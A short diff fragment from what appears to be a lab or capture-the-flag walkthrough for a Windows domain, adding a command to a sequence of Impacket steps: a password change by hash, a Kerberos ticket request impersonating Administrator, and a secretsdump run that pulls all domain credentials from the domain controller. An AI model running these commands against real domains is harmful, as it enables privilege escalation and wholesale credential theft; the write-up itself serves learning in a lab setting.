@@ -1357,6 +1357,8 @@ describeTicket.py wsilva.ccache
 changepasswd.py -newhashes :d777c9fe8cdbfbadca48b671967f54e7 phantom/wsilva:0xdf0xdf@dc.phantom.vl
 
 KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
+
+KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache impacket-secretsdump -k -no-pass -just-dc dc.phantom.vl 
 ```
   
 </details>
